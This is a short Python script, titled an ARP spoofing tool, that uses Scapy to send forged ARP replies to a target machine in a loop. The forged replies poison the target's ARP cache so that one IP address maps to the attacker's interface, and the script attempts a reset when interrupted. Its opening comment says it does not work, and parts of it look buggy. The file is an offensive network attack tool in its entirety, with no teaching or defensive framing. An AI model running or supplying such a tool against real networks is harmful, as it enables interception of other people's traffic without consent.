

# DO no use it . Does not work
import time

import scapy.all as Scapy
import argparse


parser = argparse.ArgumentParser(description="Arp spoofing Tool")
parser.add_argument("-t","--TargetIp",required=True,type=str,help="Ip Address Of Target Machine")
parser.add_argument("-M","--TargetMac",required=True,type=str,help="Mac Address Of target Machinne")
parser.add_argument("-s","--SpoofIp",required=True,type=str,help="Ip address To Spoof")
parser.add_argument("-m","--SpoofMac",required=True,type=str,help="Mac addresso of Spoofed Ip Machine")
parser.add_argument('-i','--index',required=True,type=int,help='Index of interface')
args= parser.parse_args()



#print(args.TargetIp,args.TargetMac,args.SpoofIp,args.SpoofMac)

Eth = Scapy.Ether(dst=args.TargetMac)
arp_packet = Scapy.ARP(psrc=args.SpoofIp,hwdst=args.TargetMac,pdst=args.TargetIp,op=2,hwlen=6,plen=4)




spoof_Ether = Eth / arp_packet

try:
    while True:
        Scapy.sendp(spoof_Ether,verbose=False,iface=Scapy.conf.ifaces.dev_from_index(args.index)) #iface=Scapy.conf.ifaces.dev_from_index(8) send packet to interface index 8 which wifi
        time.sleep(2)
except KeyboardInterrupt as Err:
    Eth = Scapy.Ether(dst=args.TargetMac)#,src=args.SpoofMac
    arp_packet.hwsrc = args.SpoofMac
    reset = Eth/arp_packet  #;reset.show()
    for i in range(10):
        Scapy.send(arp_packet,iface=Scapy.conf.ifaces.dev_from_index(args.index),verbose=False)
